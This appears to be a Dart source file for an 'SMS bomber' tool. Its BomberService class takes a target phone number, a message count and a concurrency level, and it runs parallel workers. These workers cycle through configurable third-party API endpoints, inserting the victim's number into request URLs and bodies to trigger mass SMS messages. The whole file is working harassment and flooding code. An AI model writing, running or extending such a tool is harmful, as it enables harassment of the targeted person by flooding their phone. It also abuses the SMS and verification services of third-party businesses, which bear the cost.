import 'package:http/http.dart' as http;
import '../models/api_endpoint.dart';

class BomberService {
  bool _running = false;
  int _sent = 0;
  int _failed = 0;

  int get sent => _sent;
  int get failed => _failed;
  bool get running => _running;

  void stop() => _running = false;

  Future<void> start({
    required List<ApiEndpoint> endpoints,
    required String targetNumber,
    required int totalSms,
    required int concurrency,
    required Function(int sent, int failed) onProgress,
    required Function() onComplete,
  }) async {
    _running = true;
    _sent = 0;
    _failed = 0;

    final active = endpoints.where((e) => e.enabled).toList();
    if (active.isEmpty) {
      _running = false;
      onComplete();
      return;
    }

    final queue = <int>[];
    for (int i = 0; i < totalSms; i++) {
      queue.add(i);
    }

    Future<void> worker() async {
      while (_running && queue.isNotEmpty) {
        queue.removeAt(0);
        final api = active[(_sent + _failed) % active.length];
        try {
          final ok = await _fire(api, targetNumber);
          ok ? _sent++ : _failed++;
        } catch (_) {
          _failed++;
        }
        onProgress(_sent, _failed);
      }
    }

    await Future.wait(List.generate(concurrency, (_) => worker()));
    _running = false;
    onComplete();
  }

  Future<bool> _fire(ApiEndpoint api, String phone) async {
    final body = api.bodyTemplate.replaceAll('{phone}', phone);
    final uri =
        Uri.parse(api.url.replaceAll('{phone}', Uri.encodeComponent(phone)));

    final res = api.method.toUpperCase() == 'GET'
        ? await http
            .get(uri, headers: api.headers)
            .timeout(const Duration(seconds: 10))
        : await http
            .post(uri, headers: api.headers, body: body)
            .timeout(const Duration(seconds: 10));

    return res.statusCode >= 200 && res.statusCode < 300;
  }
}